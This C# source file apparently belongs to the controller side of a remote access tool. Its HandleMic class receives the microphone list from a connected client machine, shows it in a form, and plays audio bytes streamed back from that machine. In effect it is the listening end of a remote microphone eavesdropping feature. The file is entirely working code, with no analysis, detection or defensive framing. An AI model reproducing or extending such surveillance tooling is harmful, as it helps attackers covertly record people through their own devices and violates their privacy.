using System;
using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System.Windows.Forms;
using System.Diagnostics;

namespace Server.Handle_Packet
{

    public class HandleMic
    {

        public void Microphone(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormMicrophone mic = (FormMicrophone)Application.OpenForms["Audio : " + unpack_msgpack.ForcePathObject("ID").AsString];
                if (mic != null)
                {
                    if (mic.Client == null)
                    {
                        mic.Client = client;
                        mic.timer1.Enabled = true;
                    }

                    string microphones = unpack_msgpack.ForcePathObject("Miclist").GetAsString();
                    string[] mics = microphones.Split(new[] { '\\' }, StringSplitOptions.None);
                    mic.listBox1.Items.Clear();
                    mic.listBox1.Items.AddRange(mics);
                }
            }
            catch { }
        }

        public void ToAudio(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                byte[] audiobytes = unpack_msgpack.ForcePathObject("AudioBytes").GetAsBytes();
                AudioListener.PlayAudio(audiobytes);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Audio Processing Error: " + ex.Message);
            }
        }

    }
}
